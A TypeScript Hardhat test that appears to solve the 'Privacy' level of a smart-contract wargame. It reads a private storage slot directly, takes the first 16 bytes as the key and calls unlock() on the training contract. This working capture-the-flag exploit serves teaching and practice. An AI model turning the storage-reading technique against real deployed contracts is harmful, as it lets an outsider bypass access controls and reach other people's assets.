import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";
import { PRIVACY_LEVEL_ADDRESS } from "./constants";
import { TestOptions, setupChallenge, submitLevel } from "./utils";

describe("Privacy", () => {
  let challenge: Contract;

  before(async () => {
    const contractLevel = PRIVACY_LEVEL_ADDRESS;
    const contractName = "Privacy";
    const options: TestOptions = { contractName };
    ({ challenge } = await setupChallenge(contractLevel, options));
  });

  it("solves the challenge", async () => {
    expect(await challenge.locked()).to.be.true;

    /**
     * @see https://docs.soliditylang.org/en/v0.8.21/internals/layout_in_storage.html
     */
    // slot0 - 0x0000000000000000000000000000000000000000000000000000000000000001 (true)
    // slot1 - 0x0000000000000000000000000000000000000000000000000000000064ec79c9 (block.timestamp)
    // slot2 - 0x0000000000000000000000000000000000000000000000000000000079c9ff0a (0a - 10, ff - 255, 79c9 - now) slot packing
    // slot3 - 0x3be4db753c44389b24c13ba86125aca00fa5995f96a93c1cafc7e9282c7de7a1 data[0]
    // slot4 - 0xb7852bca4521335c6fcbfced0c6567ee37e30313cc9529c08f2e0b6f35513e62 data[1]
    // slot5 - 0x34663b70479d0b4c08cbaba740bbfdbfebae6b8de2f60237a93a3cefa284308b data[2]

    const slot5 = await ethers.provider?.getStorageAt(challenge.address, 5);
    const bytes16Key = slot5.slice(0, 34);
    await challenge.unlock(bytes16Key);

    expect(await challenge.locked()).to.be.false;
  });

  after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
  });
});
